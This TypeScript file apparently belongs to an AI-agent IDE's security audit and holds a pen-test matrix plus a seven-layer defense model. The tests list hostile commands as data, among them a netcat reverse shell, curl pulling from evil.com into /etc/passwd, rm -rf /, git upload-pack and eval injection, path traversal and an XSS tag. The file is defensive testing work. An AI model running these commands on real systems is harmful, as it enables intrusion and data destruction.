/**
 * @c3/security-audit — Penetration Test Framework + Security Model
 *
 * Provides:
 *   1. Security test matrix (automated pen-tests)
 *   2. Documented security model (7-layer defense)
 *   3. Audit runner that validates all layers
 *   4. Report generator
 *
 * Test categories:
 *   - Command injection (Layer 1-3)
 *   - Argument injection (Layer 2)
 *   - Path traversal (Layer 4)
 *   - Environment leakage (Layer 5)
 *   - Output overflow (Layer 7)
 *   - WebSocket auth bypass (WS security)
 *   - Rate limit bypass (WS security)
 *   - Input injection (WS security)
 */

// ─── Security Test Definition ────────────────────────────

export type TestCategory =
  | 'command_injection'
  | 'arg_injection'
  | 'path_traversal'
  | 'env_leakage'
  | 'npm_script_injection'
  | 'output_overflow'
  | 'ws_auth_bypass'
  | 'ws_rate_limit'
  | 'ws_input_injection'
  | 'concurrent_exec'
  | 'timeout_kill';

export type ExpectedResult = 'blocked' | 'sanitized' | 'limited' | 'killed' | 'truncated';

export interface SecurityTest {
  id: string;
  category: TestCategory;
  description: string;
  /** The attack vector */
  attack: {
    command?: string;
    args?: string[];
    cwd?: string;
    wsMessage?: string;
    wsAddress?: string;
    env?: Record<string, string>;
  };
  expected: ExpectedResult;
  /** Which defense layer should catch this */
  expectedLayer: number;
  severity: 'critical' | 'high' | 'medium' | 'low';
}

export interface TestResult {
  test: SecurityTest;
  passed: boolean;
  actualResult: string;
  details?: string;
  durationMs: number;
}

export interface AuditReport {
  timestamp: string;
  platform: string;
  totalTests: number;
  passed: number;
  failed: number;
  results: TestResult[];
  securityScore: number;  // 0-100
  recommendations: string[];
}

// ─── Security Test Matrix ────────────────────────────────

const ENV_LEAKAGE_TEST_VALUES = Object.freeze({
  anthropic: 'sk-ant-secret123',
  database: 'postgres://user:pass@host/db',
  custom: 'super-secret-value',
});

export const SECURITY_TESTS: SecurityTest[] = [
  // ── Command Injection (Layer 1) ──
  {
    id: 'cmd-001',
    category: 'command_injection',
    description: 'rm -rf / — direct destructive command',
    attack: { command: 'rm', args: ['-rf', '/'] },
    expected: 'blocked',
    expectedLayer: 1,
    severity: 'critical',
  },
  {
    id: 'cmd-002',
    category: 'command_injection',
    description: 'bash — shell access',
    attack: { command: 'bash', args: ['-c', 'echo pwned'] },
    expected: 'blocked',
    expectedLayer: 1,
    severity: 'critical',
  },
  {
    id: 'cmd-003',
    category: 'command_injection',
    description: 'sh — shell access',
    attack: { command: 'sh', args: ['-c', 'whoami'] },
    expected: 'blocked',
    expectedLayer: 1,
    severity: 'critical',
  },
  {
    id: 'cmd-004',
    category: 'command_injection',
    description: 'nc (netcat) — reverse shell',
    attack: { command: 'nc', args: ['-e', '/bin/sh', '10.0.0.1', '4444'] },
    expected: 'blocked',
    expectedLayer: 1,
    severity: 'critical',
  },
  {
    id: 'cmd-005',
    category: 'command_injection',
    description: 'sudo — privilege escalation',
    attack: { command: 'sudo', args: ['rm', '-rf', '/'] },
    expected: 'blocked',
    expectedLayer: 1,
    severity: 'critical',
  },
  {
    id: 'cmd-006',
    category: 'command_injection',
    description: 'chmod 777 — permission change (allowed command but monitored)',
    attack: { command: 'chmod', args: ['777', '/etc/passwd'] },
    expected: 'blocked',
    expectedLayer: 4,
    severity: 'high',
  },

  // ── Argument Injection (Layer 2) ──
  {
    id: 'arg-001',
    category: 'arg_injection',
    description: 'node -e "exec(...)" — eval execution',
    attack: { command: 'node', args: ['-e', 'require("child_process").execSync("whoami")'] },
    expected: 'blocked',
    expectedLayer: 2,
    severity: 'critical',
  },
  {
    id: 'arg-002',
    category: 'arg_injection',
    description: 'python -c "import os; ..." — eval execution',
    attack: { command: 'python3', args: ['-c', 'import os; os.system("whoami")'] },
    expected: 'blocked',
    expectedLayer: 2,
    severity: 'critical',
  },
  {
    id: 'arg-003',
    category: 'arg_injection',
    description: 'git --upload-pack=malicious — git hook injection',
    attack: { command: 'git', args: ['clone', '--upload-pack=rm -rf /', 'https://example.com/repo'] },
    expected: 'blocked',
    expectedLayer: 2,
    severity: 'critical',
  },
  {
    id: 'arg-004',
    category: 'arg_injection',
    description: 'curl -o /etc/passwd — write to arbitrary path',
    attack: { command: 'curl', args: ['-o', '/etc/passwd', 'https://evil.com/payload'] },
    expected: 'blocked',
    expectedLayer: 2,
    severity: 'high',
  },
  {
    id: 'arg-005',
    category: 'arg_injection',
    description: 'shell: false blocks semicolons as literal args',
    attack: { command: 'ls', args: ['; rm -rf /'] },
    expected: 'blocked',
    expectedLayer: 4,
    severity: 'high',
  },

  // ── Path Traversal (Layer 4) ──
  {
    id: 'path-001',
    category: 'path_traversal',
    description: 'cat ../../etc/passwd — read sensitive file',
    attack: { command: 'cat', args: ['../../etc/passwd'] },
    expected: 'blocked',
    expectedLayer: 4,
    severity: 'critical',
  },
  {
    id: 'path-002',
    category: 'path_traversal',
    description: 'cwd outside sandbox — escape project dir',
    attack: { command: 'ls', args: ['.'], cwd: '/etc' },
    expected: 'blocked',
    expectedLayer: 4,
    severity: 'critical',
  },
  {
    id: 'path-003',
    category: 'path_traversal',
    description: 'ls ../../../ — directory traversal',
    attack: { command: 'ls', args: ['../../../'] },
    expected: 'blocked',
    expectedLayer: 4,
    severity: 'high',
  },

  // ── npm Script Injection (Layer 2b) ──
  {
    id: 'npm-001',
    category: 'npm_script_injection',
    description: 'npm install — must inject --ignore-scripts',
    attack: { command: 'npm', args: ['install'] },
    expected: 'sanitized',
    expectedLayer: 2,
    severity: 'high',
  },
  {
    id: 'npm-002',
    category: 'npm_script_injection',
    description: 'npm exec — blocked subcommand',
    attack: { command: 'npm', args: ['exec', 'malicious-pkg'] },
    expected: 'blocked',
    expectedLayer: 2,
    severity: 'high',
  },

  // ── Environment Leakage (Layer 5) ──
  {
    id: 'env-001',
    category: 'env_leakage',
    description: 'ANTHROPIC_API_KEY must be stripped',
    attack: { env: { ANTHROPIC_API_KEY: ENV_LEAKAGE_TEST_VALUES.anthropic } },
    expected: 'sanitized',
    expectedLayer: 5,
    severity: 'critical',
  },
  {
    id: 'env-002',
    category: 'env_leakage',
    description: 'DATABASE_URL must be stripped',
    attack: { env: { DATABASE_URL: ENV_LEAKAGE_TEST_VALUES.database } },
    expected: 'sanitized',
    expectedLayer: 5,
    severity: 'high',
  },
  {
    id: 'env-003',
    category: 'env_leakage',
    description: 'Custom MY_APP_SECRET must be stripped (suffix match)',
    attack: { env: { MY_APP_SECRET: ENV_LEAKAGE_TEST_VALUES.custom } },
    expected: 'sanitized',
    expectedLayer: 5,
    severity: 'high',
  },

  // ── WebSocket Auth Bypass ──
  {
    id: 'ws-001',
    category: 'ws_auth_bypass',
    description: 'Connection from non-local IP — rejected',
    attack: { wsAddress: '192.168.1.100' },
    expected: 'blocked',
    expectedLayer: 0,
    severity: 'critical',
  },
  {
    id: 'ws-002',
    category: 'ws_auth_bypass',
    description: 'Connection without session token — rejected',
    attack: { wsAddress: '127.0.0.1' },
    expected: 'blocked',
    expectedLayer: 0,
    severity: 'critical',
  },

  // ── WebSocket Input Injection ──
  {
    id: 'ws-003',
    category: 'ws_input_injection',
    description: 'Oversized message (>100KB) — rejected',
    attack: { wsMessage: 'x'.repeat(200000) },
    expected: 'blocked',
    expectedLayer: 0,
    severity: 'medium',
  },
  {
    id: 'ws-004',
    category: 'ws_input_injection',
    description: 'Invalid JSON — rejected',
    attack: { wsMessage: '{not valid json' },
    expected: 'blocked',
    expectedLayer: 0,
    severity: 'medium',
  },
  {
    id: 'ws-005',
    category: 'ws_input_injection',
    description: 'Unknown message type — rejected',
    attack: { wsMessage: JSON.stringify({ type: 'exec_arbitrary', payload: 'rm -rf /' }) },
    expected: 'blocked',
    expectedLayer: 0,
    severity: 'high',
  },
  {
    id: 'ws-006',
    category: 'ws_input_injection',
    description: 'Script tags in chat content — sanitized',
    attack: { wsMessage: JSON.stringify({ type: 'chat', content: '<script>alert("xss")</script>hello' }) },
    expected: 'sanitized',
    expectedLayer: 0,
    severity: 'medium',
  },
];

// ─── Security Model Documentation ────────────────────────

export const SECURITY_MODEL = `
# C3 IDE Security Model

## Threat Model

C3 IDE runs an AI agent that can execute shell commands on the user's machine.
The primary threat is: **malicious or confused LLM output that attempts to
execute harmful commands.**

Secondary threats:
- Network attackers connecting to the WebSocket backend
- Malicious npm packages executing lifecycle scripts
- Path traversal attacks escaping the project sandbox
- Environment variable leakage exposing API keys

## Defense-in-Depth: 7 Layers

### Layer 1: Command Whitelist
Only pre-approved commands can execute. No bash, sh, perl, ruby, etc.
Whitelist covers: build tools, VCS, file ops (read-preferred), network (curl/wget).

### Layer 2: Argument Blacklist
Even whitelisted commands can't use dangerous args:
- node -e, python -c (eval)
- git --upload-pack (hook injection)
- curl -o (write arbitrary file)
Per-command and global blacklists.

### Layer 2b: npm Safety
- npm subcommands restricted to safe list (install, test, build, etc.)
- npm install/ci ALWAYS get --ignore-scripts injected
- Blocks npm exec, npm explore, etc.

### Layer 3: argv-based Spawn
ALWAYS spawn with shell: false. This means:
- Semicolons are literal args, not command separators
- Pipes are literal args, not pipe operators
- Backticks are literal args, not command substitution
- No environment variable expansion in args

### Layer 4: cwd Sandbox
- Working directory must resolve inside project root
- Symlinks resolved before comparison (prevent symlink attacks)
- Path traversal in args detected (../../etc/passwd blocked)

### Layer 5: Environment Sanitization
Child processes get a sanitized copy of the environment:
- API keys stripped (OPENAI_API_KEY, ANTHROPIC_API_KEY, etc.)
- Database credentials stripped
- SSH/GPG agent sockets stripped
- Pattern matching: *_SECRET, *_TOKEN, *_KEY, *_PASSWORD

### Layer 6: Bubblewrap (Linux)
If bubblewrap is installed, commands run in an isolated sandbox:
- Read-only root filesystem
- Write access only to project directory
- Isolated /tmp
- PID namespace isolation
- Network isolation (per-command heuristic)
- Die-with-parent (no orphaned processes)

### Layer 7: Timeout + Kill
- Default: 30s timeout
- SIGTERM first, SIGKILL after 5s grace period
- Output truncated at 64KB (prevent memory exhaustion)

## WebSocket Security

### Local-Only Binding
Server binds to 127.0.0.1 only. Connections from non-local IPs rejected.

### Session Token
Random 256-bit token generated on startup. Required in WS handshake.
Constant-time comparison prevents timing attacks.

### Rate Limiting
Token bucket algorithm: 20 burst, 100/min sustained.
Prevents message flooding.

### Input Validation
- Max message size: 100KB
- JSON schema validation
- Message type whitelist
- Script/iframe tag stripping
- Null byte removal

## Known Risks & Mitigations

| Risk | Severity | Mitigation |
|------|----------|------------|
| npm lifecycle scripts | High | --ignore-scripts forced |
| Docker escape | Medium | Docker commands whitelisted but user-controlled |
| Symlink race condition | Low | realpath() before comparison |
| bwrap unavailable | Medium | Layers 1-5 still active |
| LLM social engineering | Medium | All 7 layers are code-enforced, not prompt-based |
`;
